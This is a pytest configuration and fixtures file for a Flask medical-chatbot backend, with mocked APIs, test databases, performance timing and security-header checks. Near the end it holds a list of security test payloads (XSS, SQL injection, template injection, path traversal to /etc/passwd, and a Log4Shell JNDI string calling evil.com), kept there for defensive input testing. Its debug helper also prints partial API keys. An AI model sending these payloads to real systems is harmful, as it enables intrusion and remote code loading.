# -*- coding: utf-8 -*-
"""
Pytest Configuration and Fixtures
Comprehensive test setup for backend validation
"""

import os
import sys
import pytest
import tempfile
import sqlite3
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from typing import Generator, Dict, Any
import json
import time

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import Flask app and dependencies
try:
    from main_ultra_optimized import create_app
except ImportError:
    from main import create_app
from app_config import config, EnvironmentConfig

class TestConfig:
    """Test-specific configuration"""
    TESTING = True
    DEBUG = False
    SECRET_KEY = 'test-secret-key-for-testing-only'
    RATE_LIMIT_ENABLED = False
    CACHE_ENABLED = False
    EMBEDDINGS_ENABLED = True  # Enable for medical validation tests
    RAG_AVAILABLE = True  # Enable for medical validation tests
    QA_ENABLED = False
    EMAIL_ENABLED = False
    METRICS_ENABLED = False

    # Database settings for testing
    SQLITE_DB_PATH = ':memory:'
    # Note: Supabase config read dynamically from environment in fixture

def _debug_print_config(label: str, app_config_dict: dict = None):
    """Helper to print debug config information"""
    print(f"[TEST DEBUG] {label}")
    if app_config_dict:
        for key in ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY']:
            val = app_config_dict.get(key)
            truncate_len = 50 if 'URL' in key else 20
            print(f"  {key}: {val[:truncate_len] if val else 'None'}...")
    else:
        # Print from environment
        for key in ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'OPENROUTER_API_KEY']:
            val = os.getenv(key, 'NOT SET')
            truncate_len = 50 if 'URL' in key else 20
            print(f"  {key}: {val[:truncate_len] if val else 'NOT SET'}...")

def _restore_supabase_config(app, saved_config: dict):
    """Restore Supabase configuration from saved values or environment"""
    app.config['SUPABASE_URL'] = saved_config['url'] or os.getenv('SUPABASE_URL')
    app.config['SUPABASE_KEY'] = saved_config['service_key'] or os.getenv('SUPABASE_SERVICE_KEY') or os.getenv('SUPABASE_KEY')
    app.config['SUPABASE_SERVICE_KEY'] = saved_config['service_key'] or os.getenv('SUPABASE_SERVICE_KEY')
    app.config['OPENROUTER_API_KEY'] = os.getenv('OPENROUTER_API_KEY', 'test-key')
    app.config['HUGGINGFACE_API_KEY'] = os.getenv('HUGGINGFACE_API_KEY', 'test-key')

@pytest.fixture(scope="session")
def app():
    """Create Flask app instance for testing"""
    _debug_print_config("Environment variables", None)

    # Set test environment
    os.environ.update({
        'TESTING': 'true',
        'ENVIRONMENT': 'testing',
        'SECRET_KEY': TestConfig.SECRET_KEY,
        'RATE_LIMIT_ENABLED': 'false'
    })

    # Mock heavy dependencies during app creation
    with patch('core.security.enhanced_security.init_security_optimizations'), \
         patch('core.performance.response_optimizer.init_performance_optimizations'), \
         patch('core.security.production_rate_limiter.init_production_rate_limiter'):
        app = create_app()

    # Preserve Supabase config before TestConfig override
    saved_config = {
        'url': app.config.get('SUPABASE_URL'),
        'key': app.config.get('SUPABASE_KEY'),
        'service_key': app.config.get('SUPABASE_SERVICE_KEY')
    }
    _debug_print_config("Before override", saved_config)

    # Apply TestConfig
    for key, value in vars(TestConfig).items():
        if not key.startswith('_'):
            app.config[key] = value

    # Restore Supabase config from environment
    _restore_supabase_config(app, saved_config)
    _debug_print_config("After restore", app.config)

    app.config['TESTING'] = True
    return app

@pytest.fixture
def client(app):
    """Create test client"""
    return app.test_client()

@pytest.fixture
def runner(app):
    """Create test CLI runner"""
    return app.test_cli_runner()

@pytest.fixture
def mock_cache():
    """Mock cache system"""
    cache = Mock()
    cache.get.return_value = None
    cache.set.return_value = True
    cache.delete.return_value = True
    cache.clear.return_value = True
    return cache

@pytest.fixture
def mock_rag_service():
    """Mock RAG service for testing"""
    rag = Mock()
    rag.search.return_value = {
        'results': [
            {
                'content': 'Test medical content',
                'score': 0.95,
                'source': 'test_document.md'
            }
        ],
        'status': 'success'
    }
    rag.is_available.return_value = True
    return rag

@pytest.fixture
def mock_openrouter_api():
    """Mock OpenRouter API responses"""
    with patch('requests.post') as mock_post:
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'choices': [{
                'message': {
                    'content': 'Test AI response for medical query'
                }
            }],
            'usage': {
                'prompt_tokens': 100,
                'completion_tokens': 50,
                'total_tokens': 150
            }
        }
        mock_post.return_value = mock_response
        yield mock_post

@pytest.fixture
def sample_medical_query():
    """Sample medical query for testing"""
    return {
        'message': 'Qual é a dose recomendada de rifampicina para adultos com hanseníase?',
        'persona': 'dr_gasnelio',
        'context': 'dispensing_guidance'
    }

@pytest.fixture
def sample_image_data():
    """Sample image data for multimodal testing"""
    # Create a simple test image (1x1 PNG)
    import base64
    # Minimal PNG data
    png_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x12IDATx\x9cc\xf8\x0f\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a%\x10[\x00\x00\x00\x00IEND\xaeB`\x82'
    return base64.b64encode(png_data).decode('utf-8')

@pytest.fixture
def temp_database():
    """Create temporary SQLite database for testing"""
    fd, path = tempfile.mkstemp(suffix='.db')

    # Create basic tables
    conn = sqlite3.connect(path)
    cursor = conn.cursor()

    # User feedback table
    cursor.execute('''
        CREATE TABLE user_feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            feedback_text TEXT,
            rating INTEGER,
            persona TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Chat sessions table
    cursor.execute('''
        CREATE TABLE chat_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            persona TEXT,
            message_count INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Rate limiting table
    cursor.execute('''
        CREATE TABLE rate_limits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT,
            endpoint TEXT,
            request_count INTEGER DEFAULT 1,
            window_start DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    conn.commit()
    conn.close()

    yield path

    # Cleanup
    os.close(fd)
    os.unlink(path)

@pytest.fixture
def performance_monitor():
    """Performance monitoring fixture"""
    class PerformanceMonitor:
        def __init__(self):
            self.metrics = {}
            self.start_times = {}

        def start_timer(self, operation: str):
            self.start_times[operation] = time.time()

        def end_timer(self, operation: str):
            if operation in self.start_times:
                duration = time.time() - self.start_times[operation]
                self.metrics[operation] = duration
                return duration
            return None

        def get_metrics(self):
            return self.metrics.copy()

        def assert_performance(self, operation: str, max_duration: float):
            assert operation in self.metrics, f"Operation {operation} not measured"
            assert self.metrics[operation] <= max_duration, \
                f"Operation {operation} took {self.metrics[operation]:.3f}s, expected <= {max_duration}s"

    return PerformanceMonitor()

@pytest.fixture
def security_validator():
    """Security validation fixture"""
    class SecurityValidator:
        def __init__(self):
            self.security_checks = {}

        def check_cors_headers(self, response):
            """Validate CORS headers are present"""
            required_headers = [
                'Access-Control-Allow-Origin',
                'Access-Control-Allow-Methods',
                'Access-Control-Allow-Headers'
            ]

            for header in required_headers:
                assert header in response.headers, f"Missing CORS header: {header}"

            self.security_checks['cors'] = True

        def check_security_headers(self, response):
            """Validate security headers are present"""
            security_headers = [
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy'
            ]

            for header in security_headers:
                assert header in response.headers, f"Missing security header: {header}"

            self.security_checks['security_headers'] = True

        def check_content_type(self, response, expected='application/json'):
            """Validate response content type"""
            assert response.content_type.startswith(expected), \
                f"Expected content-type {expected}, got {response.content_type}"

            self.security_checks['content_type'] = True

        def check_no_sensitive_data(self, response_data):
            """Check response doesn't contain sensitive data"""
            sensitive_patterns = [
                'password', 'secret', 'key', 'token', 'api_key',
                'private', 'confidential', 'internal'
            ]

            response_str = json.dumps(response_data).lower()
            for pattern in sensitive_patterns:
                assert pattern not in response_str, \
                    f"Response contains potentially sensitive data: {pattern}"

            self.security_checks['no_sensitive_data'] = True

        def get_security_status(self):
            return self.security_checks.copy()

    return SecurityValidator()

@pytest.fixture(autouse=True)
def reset_environment():
    """Reset environment variables after each test"""
    original_env = os.environ.copy()
    yield

    # Restore original environment
    os.environ.clear()
    os.environ.update(original_env)

@pytest.fixture
def mock_external_apis():
    """Mock all external API calls"""
    with patch('requests.get') as mock_get, \
         patch('requests.post') as mock_post, \
         patch('openai.OpenAI') as mock_openai:

        # Configure mock responses
        mock_get.return_value.status_code = 200
        mock_get.return_value.json.return_value = {'status': 'ok'}

        mock_post.return_value.status_code = 200
        mock_post.return_value.json.return_value = {
            'choices': [{'message': {'content': 'Mock AI response'}}]
        }

        # Mock OpenAI client
        mock_client = Mock()
        mock_client.embeddings.create.return_value.data = [
            Mock(embedding=[0.1] * 384)
        ]
        mock_openai.return_value = mock_client

        yield {
            'get': mock_get,
            'post': mock_post,
            'openai': mock_openai
        }

# Utility functions for testing
def assert_valid_json_response(response, expected_status=200):
    """Assert response is valid JSON with expected status"""
    assert response.status_code == expected_status, \
        f"Expected status {expected_status}, got {response.status_code}"

    assert response.content_type.startswith('application/json'), \
        f"Expected JSON response, got {response.content_type}"

    try:
        data = response.get_json()
        assert data is not None, "Response body is not valid JSON"
        return data
    except Exception as e:
        pytest.fail(f"Failed to parse JSON response: {e}")

def assert_error_response(response, expected_status, error_code=None):
    """Assert response is a properly formatted error"""
    data = assert_valid_json_response(response, expected_status)

    assert 'error' in data, "Error response missing 'error' field"
    assert 'timestamp' in data, "Error response missing 'timestamp' field"

    if error_code:
        assert 'error_code' in data, "Error response missing 'error_code' field"
        assert data['error_code'] == error_code, \
            f"Expected error_code {error_code}, got {data.get('error_code')}"

    return data

# Performance thresholds
PERFORMANCE_THRESHOLDS = {
    'health_check': 0.6,      # 600ms (increased due to RAG initialization)
    'chat_response': 2.0,     # 2 seconds
    'persona_list': 0.2,      # 200ms
    'feedback_submit': 0.5,   # 500ms
    'stats_endpoint': 0.3,    # 300ms
    'multimodal_process': 5.0 # 5 seconds for image processing
}

# Security test data
SECURITY_TEST_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"; DROP TABLE users; --',
    '{{7*7}}',
    '${jndi:ldap://evil.com/x}',
    '../../../etc/passwd',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '\x00\x01\x02\x03'
]

# Rate limiting test data
RATE_LIMIT_TEST_REQUESTS = 100  # Number of requests to test rate limiting
RATE_LIMIT_EXPECTED_BLOCKS = 50  # Expected number of blocked requests